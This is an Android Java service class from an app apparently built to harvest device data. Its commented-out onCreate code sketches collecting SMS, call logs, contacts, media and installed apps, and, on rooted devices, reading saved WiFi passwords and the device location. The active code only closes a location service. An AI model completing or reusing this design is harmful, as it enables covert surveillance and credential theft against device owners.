package com.fs.fs.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;

import com.fs.fs.api.LocationService;

/**
 * Created by wyx on 2017/1/7.
 */

public class AppService extends Service {
    // TODO: SharePreferencesUtils 保存基本设定  SharePreferencesUtils 对比原有新增等
    // TODO: Receiver 生命进程
    // TODO: 安装 更新Service
    @Override
    public void onCreate() {
        super.onCreate();
//        new InitTask().executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR,
//                InitTask.SMS, InitTask.CALL, InitTask.CONTANT,
//                InitTask.VIDEO, InitTask.PICTURE, InitTask.INSTALL);

//        if (NetworkUtils.isNetworkAvailable(this)) {
//            DeviceService.getCameraInfo();
//            if (DeviceUtils.isRoot()) {
//                // Get wifi password and the locate
//                DeviceService.getWifiPasswd();
//                LocationService.getInstance().once(new LocationService.LocateListener() {
//                    @Override
//                    public void onLocateSucceed(AMapLocation aMapLocation) {
//
//                    }
//
//                    @Override
//                    public void onLocateFail(int errorCode, String errorInfo) {
//
//                    }
//                });
//            }
//        }
    }


    @Override
    public void onDestroy() {
        LocationService.getInstance().close();
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
